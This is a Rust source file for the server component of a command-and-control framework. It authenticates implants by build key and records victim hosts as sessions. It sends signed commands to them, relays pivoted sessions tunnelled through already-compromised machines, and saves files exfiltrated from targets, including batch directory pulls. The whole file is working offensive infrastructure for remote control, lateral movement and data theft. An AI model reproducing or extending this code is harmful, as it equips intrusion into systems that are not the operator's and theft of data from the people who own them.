use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::sync::{mpsc, oneshot};
use std::net::SocketAddr;
use std::sync::atomic::{Ordering, AtomicU32};
use ed25519_dalek::{SigningKey, Signer};
use chrono::Utc;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use std::collections::HashMap;
use std::pin::Pin;
use std::future::Future;

use crate::common::{ClientHello, Session, SecuredCommand, CommandResponse, SharedSessions, PivotFrame};
use crate::database::{self, DbRef};
use crate::api::SharedResults;
use crate::file_transfer;
use crate::transport::{BoxedStream, C2Stream}; 

static NEXT_ID: AtomicU32 = AtomicU32::new(1);

// FIX: Returns a Boxed Future to allow recursion without infinite type size errors
pub fn handle_connection(
    stream: BoxedStream, 
    addr: SocketAddr,
    sessions: SharedSessions,
    db: DbRef,
    results: SharedResults,
    parent_id: Option<u32> // [NEW] Added parent_id argument
) -> Pin<Box<dyn Future<Output = ()> + Send>> {
    Box::pin(async move {
        let (mut reader, mut writer) = tokio::io::split(stream);

        // Map: Child Session ID -> Sender to push data into the Virtual Duplex Stream
        let mut virtual_sessions: HashMap<u32, mpsc::UnboundedSender<Vec<u8>>> = HashMap::new();

        // 1. Handshake
        let len = match reader.read_u32().await { 
            Ok(n) => n, 
            Err(e) => {
                if e.kind() != std::io::ErrorKind::UnexpectedEof {
                    eprintln!("[-] Handshake Read Error from {}: {}", addr, e);
                }
                return;
            } 
        };

        let mut hello_buf = vec![0u8; len as usize];
        if let Err(e) = reader.read_exact(&mut hello_buf).await {
            eprintln!("[-] Handshake Body Error from {}: {}", addr, e);
            return; 
        }
        
        let hello: ClientHello = match serde_json::from_slice(&hello_buf) { 
            Ok(h) => h, 
            Err(e) => {
                eprintln!("[-] JSON Parse Error from {}: {}", addr, e);
                return;
            }
        };

        // 2. Authentication
        let signing_key = {
            let conn = db.lock().unwrap();
            match database::get_build_key(&conn, &hello.build_id) {
                Some(k) => match k.try_into() { 
                    Ok(a) => SigningKey::from_bytes(&a), 
                    Err(_) => {
                        eprintln!("[-] Invalid Key Format for Build ID: {}", hello.build_id);
                        return;
                    } 
                },
                None => {
                    eprintln!("[-] Unknown Build ID from {}: {}", addr, hello.build_id);
                    eprintln!("    [!] Ensure you imported 'dist/server_keys.json' or ran builder with auto-update.");
                    return;
                },
            }
        };

        // 3. Register Session
        let sess_id = NEXT_ID.fetch_add(1, Ordering::Relaxed);
        {
            let conn = db.lock().unwrap();
            database::log_new_session(&conn, &hello.exe_id, &hello.computer_id, &hello.hostname, &hello.os, &addr.ip().to_string(), &hello.build_id);
        }
        
        let connection_type = if let Some(pid) = parent_id { format!("Tunneled via #{}", pid) } else { "Direct".to_string() };
        println!("\n[+] New Session {}: {} ({}) [{}]", sess_id, addr.ip(), hello.build_id, connection_type);

        let (tx, mut rx) = mpsc::unbounded_channel::<(String, Option<oneshot::Sender<u64>>)>();
        let (v_tx, mut v_rx) = mpsc::unbounded_channel::<(u32, Vec<u8>)>();
        
        sessions.lock().unwrap().insert(sess_id, Session {
            id: sess_id, 
            computer_id: hello.computer_id, 
            addr, 
            hostname: hello.hostname, 
            os: hello.os, 
            tx, 
            signing_key: signing_key.clone(),
            parent_id // [NEW] Store parent ID
        });

        let mut counter = 1u64;

        // 4. Main Loop
        loop {
            tokio::select! {
                // A. Send Command to THIS Agent
                Some((cmd_txt, callback)) = rx.recv() => {
                    let mut cmd = SecuredCommand { 
                        session_id: "sess".to_string(), 
                        counter, 
                        nonce: rand::random(), 
                        timestamp: Utc::now(), 
                        command: cmd_txt.clone(), 
                        signature: String::new() 
                    };
                    
                    {
                        let db_inner = db.clone();
                        let req_id = counter;
                        let log_txt = cmd_txt.clone();
                        tokio::task::spawn_blocking(move || {
                            if let Ok(conn) = db_inner.lock() {
                                database::log_command(&conn, sess_id, req_id, &log_txt);
                            }
                        });
                    }

                    let sig = signing_key.sign(&cmd.get_signable_bytes());
                    cmd.signature = BASE64.encode(sig.to_bytes());
                    
                    let j = serde_json::to_vec(&cmd).unwrap();
                    if writer.write_u32(j.len() as u32).await.is_err() || writer.write_all(&j).await.is_err() { break; }
                    let _ = writer.flush().await;

                    if let Some(cb) = callback { let _ = cb.send(counter); }
                    counter += 1;
                }

                // B. Receive Data from Agent (Could be Response OR PivotFrame)
                res = reader.read_u32() => {
                    match res {
                        Ok(l) => {
                            let mut b = vec![0u8; l as usize];
                            if reader.read_exact(&mut b).await.is_err() { break; }
                            
                            // 1. Check for PIVOT Traffic (Tunnel)
                            if let Ok(frame) = serde_json::from_slice::<PivotFrame>(&b) {
                                let child_id = frame.source; 
                                
                                if let Some(v_sender) = virtual_sessions.get(&child_id) {
                                    if !frame.data.is_empty() {
                                        let _ = v_sender.send(frame.data);
                                    }
                                } else {
                                    // [NEW] Resolve Correct IP from Metadata
                                    let mut real_addr = addr; 
                                    
                                    if !frame.metadata.is_empty() {
                                        if let Ok(parsed_ip) = frame.metadata.parse::<SocketAddr>() {
                                            real_addr = parsed_ip;
                                        }
                                    }

                                    println!("[+] New Pivoted Session detected: Child #{} via Parent #{} (Real IP: {})", child_id, sess_id, real_addr);
                                    
                                    let (server_half, bridge_half) = tokio::io::duplex(4096);
                                    
                                    let (child_tx, mut child_rx) = mpsc::unbounded_channel::<Vec<u8>>();
                                    virtual_sessions.insert(child_id, child_tx.clone());
                                    
                                    if !frame.data.is_empty() {
                                        let _ = child_tx.send(frame.data);
                                    }

                                    let v_tx_clone = v_tx.clone();
                                    
                                    tokio::spawn(async move {
                                        let (mut b_read, mut b_write) = tokio::io::split(bridge_half);
                                        let mut buf = [0u8; 4096];

                                        loop {
                                            tokio::select! {
                                                n = b_read.read(&mut buf) => {
                                                    match n {
                                                        Ok(n) if n > 0 => {
                                                            let _ = v_tx_clone.send((child_id, buf[..n].to_vec()));
                                                        },
                                                        _ => break,
                                                    }
                                                },
                                                Some(data) = child_rx.recv() => {
                                                    if b_write.write_all(&data).await.is_err() { break; }
                                                }
                                            }
                                        }
                                        println!("[Pivot] Downstream Link #{} lost.", child_id);
                                    });

                                    let s_clone = sessions.clone();
                                    let db_clone = db.clone();
                                    let r_clone = results.clone();
                                    let enum_stream = C2Stream::Virtual(server_half);
                                    
                                    // [NEW] Pass the current session ID as the parent_id
                                    let parent_session_id = Some(sess_id);

                                    tokio::spawn(async move {
                                        handle_connection(enum_stream, real_addr, s_clone, db_clone, r_clone, parent_session_id).await;
                                    });
                                }
                                continue;
                            }

                            // 2. Check for Standard Command Response
                            if let Ok(r) = serde_json::from_slice::<CommandResponse>(&b) {
                                process_response(sess_id, r, &results, &db).await;
                            }
                        }
                        Err(_) => break,
                    }
                }

                // C. Receive Data from Virtual Sessions -> Send Downstream (Tunnel)
                Some((target_child_id, data)) = v_rx.recv() => {
                    let frame = PivotFrame {
                        stream_id: 0,           
                        destination: target_child_id, 
                        source: 0,              
                        data: data,
                        metadata: String::new(), 
                    };

                    if let Ok(j) = serde_json::to_vec(&frame) {
                        if writer.write_u32(j.len() as u32).await.is_err() || writer.write_all(&j).await.is_err() { break; }
                        let _ = writer.flush().await;
                    }
                }
            }
        }

        sessions.lock().unwrap().remove(&sess_id);
        {
            let mut res_guard = results.lock().unwrap();
            res_guard.retain(|(s_id, _), _| *s_id != sess_id);
        }
        println!("\n[-] Session {} disconnected.", sess_id);
    })
}

async fn process_response(sess_id: u32, r: CommandResponse, results: &SharedResults, db: &DbRef) {
    if r.output.starts_with("file:data|") {
        let parts: Vec<&str> = r.output.splitn(4, '|').collect();
        if parts.len() == 4 {
            match file_transfer::save_download_with_metadata(sess_id, parts[1], parts[3], parts[2]) {
                Ok(m) => println!("\n[+] Single Download: {}", m),
                Err(e) => println!("\n[-] Save Error: {}", e),
            }
        }
        return;
    } 
    
    if r.output.starts_with("file:data_batch|") {
        let parts: Vec<&str> = r.output.splitn(6, '|').collect();
        if parts.len() == 6 {
            let (batch_ts, root, rel, b64) = (parts[1], parts[2], parts[3], parts[5]);
            match file_transfer::save_batch_file(batch_ts, sess_id, root, rel, b64) {
                Ok(_) => { file_transfer::append_progress(batch_ts, sess_id, root, &format!("Downloaded: {}", rel)); },
                Err(e) => { file_transfer::append_progress(batch_ts, sess_id, root, &format!("FAILED: {} - {}", rel, e)); }
            }
        }
        return;
    }

    if r.output.starts_with("file:report_batch|") {
        let parts: Vec<&str> = r.output.splitn(4, '|').collect();
        if parts.len() == 4 {
            let (batch_ts, root, json) = (parts[1], parts[2], parts[3]);
            match file_transfer::save_batch_report(batch_ts, sess_id, root, json) {
                Ok(path) => { println!("\n[+] Batch Complete: {}\n[+] Report: {}", root, path); },
                Err(e) => println!("[-] Report Error: {}", e),
            }
        }
        return;
    }

    results.lock().unwrap().insert((sess_id, r.request_id), r.clone());

    let db_inner = db.clone();
    let r_clone = r.clone();
    tokio::task::spawn_blocking(move || {
        if let Ok(conn) = db_inner.lock() {
            database::save_client_output(&conn, sess_id, r_clone.request_id, &r_clone.output, &r_clone.error);
        }
    });

    if !r.error.is_empty() {
        println!("\n[-] Session {} Error (Exit {}): {}", sess_id, r.exit_code, r.error);
    } else if !r.output.trim().is_empty() {
        println!("\n[Sess {} Output]\n{}", sess_id, r.output.trim());
    }
}
